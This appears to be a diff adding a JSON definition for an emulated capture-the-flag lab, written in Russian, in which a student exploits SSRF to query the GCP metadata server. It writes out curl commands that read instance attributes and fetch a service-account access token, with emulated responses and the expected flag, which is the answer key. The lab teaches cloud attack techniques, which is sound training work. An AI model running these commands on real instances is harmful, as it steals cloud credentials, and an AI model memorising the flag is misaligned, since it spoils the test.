@@ -1,0 +1,52 @@
+{
+  "id": "cloud-gcp-metadata",
+  "workdir": "/home/student/gcpmeta",
+  "hostname": "lab",
+  "vars": {},
+  "expect": {
+    "file": "/home/student/gcpmeta/found.txt",
+    "contains": "nto{gcp_m3t4d4t4_4ttr}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/gcpmeta",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/gcpmeta/task.md",
+      "text": "# Задача: GCP metadata\n\nПриложение уязвимо к SSRF и может обратиться к metadata-серверу GCP. Перечисли instance attributes и прочитай флаг.\n\nИнструмент: `curl` (эмуляция — ответы захвачены с реального GCP metadata server).\n"
+    },
+    {
+      "path": "/home/student/gcpmeta/notes.md",
+      "text": "Заметки\n------\n- Обязателен заголовок `Metadata-Flavor: Google`.\n- Service-account токен: .../instance/service-accounts/default/token.\n- Пользовательские метаданные: .../instance/attributes/<key>.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [-s] -H \"Metadata-Flavor: Google\" <url> — GCP metadata (эмуляция)",
+      "cases": [
+        {
+          "match": "attributes/flag",
+          "example": "curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/attributes/flag",
+          "output": "nto{gcp_m3t4d4t4_4ttr}\n"
+        },
+        {
+          "match": "instance/attributes/?\\s*$",
+          "example": "curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
+          "output": "startup-script\nflag\nssh-keys\n"
+        },
+        {
+          "match": "service-accounts/default/token",
+          "example": "curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+          "output": "{\n  \"access_token\": \"ya29.a0AfH6SMBexample\",\n  \"expires_in\": 3599,\n  \"token_type\": \"Bearer\"\n}\n"
+        },
+        {
+          "match": "service-accounts/?\\s*$",
+          "example": "curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+          "output": "default/\napp-runner@acme-prod.iam.gserviceaccount.com/\n"
+        }
+      ],
+      "fallback": "curl: (эмуляция) для этого URL нет захваченного ответа. Попробуй:\n  .../instance/attributes/\n  .../instance/attributes/flag\n  .../instance/service-accounts/default/token\n"
+    }
+  }
+}
